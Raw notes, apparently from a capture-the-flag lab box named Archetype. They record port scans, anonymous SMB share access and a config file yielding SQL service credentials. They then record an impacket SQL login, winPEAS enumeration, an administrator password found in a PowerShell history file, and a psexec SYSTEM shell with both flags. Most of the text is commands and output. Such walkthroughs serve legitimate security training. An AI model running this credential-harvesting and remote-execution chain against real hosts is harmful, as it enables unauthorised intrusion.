ip add: 10.129.168.57

rustscan:
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
445/tcp   open  microsoft-ds syn-ack
1433/tcp  open  ms-sql-s     syn-ack
5985/tcp  open  wsman        syn-ack
47001/tcp open  winrm        syn-ack
49664/tcp open  unknown      syn-ack
49665/tcp open  unknown      syn-ack
49666/tcp open  unknown      syn-ack
49667/tcp open  unknown      syn-ack
49668/tcp open  unknown      syn-ack
49669/tcp open  unknown      syn-ack


nmap:

PORT      STATE SERVICE      REASON  VERSION
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     syn-ack Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-01-06T09:55:08
| Not valid after:  2053-01-06T09:55:08
| MD5:   2a88 efb6 2610 a56b bd67 2ff1 3234 2d79
| SHA-1: a1ea 4b18 a8c9 c36f e863 2144 8f0c 40da 9440 8ec6
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQHIv3aXquobpMInMU7LKx5zANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjMwMTA2MDk1NTA4WhgPMjA1MzAxMDYwOTU1MDhaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAM8g9CRW
| wMW40A/vZ+r69QFf/9lB526vGmGDsDX8zwfAocRynK5GHSTi+Y9t7FEI+ehSpRw0
| 6nHNJdU6A2tVDQimLuzCOj9O5A45/yXJmQisGYrQLMfSGOYxosp2RsBJ8Fj0TJbU
| NWIoAwiYIFSFKcqB7jiFS6AXQ4w3k3Z3qDGMi/uo9Bv9zssT7/dgCR7afpyfy9zY
| T/rZ/eMPRSnEOyVflQXjyDvaAgjeBI2KiHAM7MKAN4k7vH/y0E4fFCjTw2sLJDiW
| rtrPP1xtVDbQSqb+e6gMItjHZhdV1/d/kenEzODnJ7SO7Q+x4DWZE65dc/XMXVW9
| Fj9Q0i+2nksUFuUCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEACr2FTX3v0s20CyqL
| 7C0K2hUDbNvgJh4fkdtn1e9CPA9hIheF2fChLtZ6vvUMJ67dQ+6reWQvEsW2Xt3O
| HQy5CSRIZf7lz5hcSZ+NVfgzQOQkcwOl9C64eaDnr4w9iIK1VFREsRS3nISNd8CH
| 53xY0Jc32luENPJUXg1S6MxdBUkZbtTo7Pdkvm9VCQHHuXn2mkDmvn4nxjg/MYsU
| 4G5NbA3VuUy1TyYvA1Gu24xFOlySlViQIdLFNOtvob76qChHFJgrcQaeh/p6eTrw
| V5c7jiHy8lcxBxcRHvyXaHqjdKJvmg7LqcfC8a9tWQBv3LcBJsDbZHyHVXejSHCe
| FAxdcg==
|_-----END CERTIFICATE-----
|_ssl-date: 2023-01-06T09:59:22+00:00; +2s from scanner time.
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack Microsoft Windows RPC
49669/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h36m02s, deviation: 3h34m40s, median: 1s
| ms-sql-info: 
|   10.129.168.57:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 37928/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 25936/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 34909/udp): CLEAN (Timeout)
|   Check 4 (port 52931/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-01-06T01:59:14-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-01-06T09:59:16
|_  start_date: N/A





 smbclient -L //10.129.168.57      
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.168.57 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

smbclient -N //10.129.168.57/backups
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

                5056511 blocks of size 4096. 2609634 blocks available
smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (2.6 KiloBytes/sec) (average 2.6 KiloBytes/sec)
smb: \> exit

Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc


impacket-mssqlclient  ARCHETYPE/sql_svc@10.129.168.57 -windows-auth                                                                                                                          1 ⨯
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> 



user flag: 3e7b102e78218e935bf3f4951fec21a3

run winpeasx64.exe


interesting file:
���������͹ Found Windows Files
File: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

read file:

type ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit


kali㉿kali)-[~/…/Lab1/MS17-010_CVE-2017-0143/venv/bin]
└─$ ./psexec.py administrator@10.129.168.57                                                                                                                                                      1 ⨯
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Requesting shares on 10.129.168.57.....
[*] Found writable share ADMIN$
[*] Uploading file ylwhiCGk.exe
[*] Opening SVCManager on 10.129.168.57.....
[*] Creating service VGBf on 10.129.168.57.....
[*] Starting service VGBf.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> cd ..
 
C:\Windows> cd ..
 
C:\> cd Users
 
C:\Users> dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users

01/19/2020  03:10 PM    <DIR>          .
01/19/2020  03:10 PM    <DIR>          ..
01/19/2020  10:39 PM    <DIR>          Administrator
01/06/2023  02:12 AM    <DIR>          Public
01/20/2020  05:01 AM    <DIR>          sql_svc
               0 File(s)              0 bytes
               5 Dir(s)  10,715,197,440 bytes free

C:\Users> cd Administrator
 
C:\Users\Administrator> dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users\Administrator

01/19/2020  10:39 PM    <DIR>          .
01/19/2020  10:39 PM    <DIR>          ..
07/27/2021  01:30 AM    <DIR>          3D Objects
07/27/2021  01:30 AM    <DIR>          Contacts
07/27/2021  01:30 AM    <DIR>          Desktop
07/27/2021  01:30 AM    <DIR>          Documents
07/27/2021  01:30 AM    <DIR>          Downloads
07/27/2021  01:30 AM    <DIR>          Favorites
07/27/2021  01:30 AM    <DIR>          Links
07/27/2021  01:30 AM    <DIR>          Music
07/27/2021  01:30 AM    <DIR>          Pictures
07/27/2021  01:30 AM    <DIR>          Saved Games
07/27/2021  01:30 AM    <DIR>          Searches
07/27/2021  01:30 AM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  10,715,197,440 bytes free

C:\Users\Administrator> cd Desktop
 
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users\Administrator\Desktop

07/27/2021  01:30 AM    <DIR>          .
07/27/2021  01:30 AM    <DIR>          ..
02/25/2020  06:36 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  10,715,197,440 bytes free

C:\Users\Administrator\Desktop> type root.txt
b91ccec3305e98240082d4474b848528
C:\Users\Administrator\Desktop> 
